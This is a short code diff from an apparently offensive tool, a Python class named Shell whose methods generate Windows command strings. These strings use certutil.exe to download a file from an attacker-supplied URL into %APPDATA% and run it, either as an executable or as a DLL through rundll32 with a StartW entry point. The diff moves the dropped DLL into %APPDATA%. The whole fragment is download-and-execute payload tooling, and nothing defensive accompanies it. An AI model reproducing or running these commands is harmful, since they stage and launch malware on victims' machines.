@@ -24,7 +24,7 @@ class Shell:
         return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&certutil.exe -urlcache -split -f {url} delete".format(ran=ran, url=url)
 
     def reverse2(self, url, ran):
-        return "certutil.exe -urlcache -split -f {url} {ran}.dll&&rundll32.exe {ran}.dll,StartW".format(ran=ran, url=url)
+        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.dll&&rundll32.exe %APPDATA%\\{ran}.dll,StartW".format(ran=ran, url=url)
 
     def downloader(self, url):
         return "certutil -urlcache -split -f {0}".format(url)
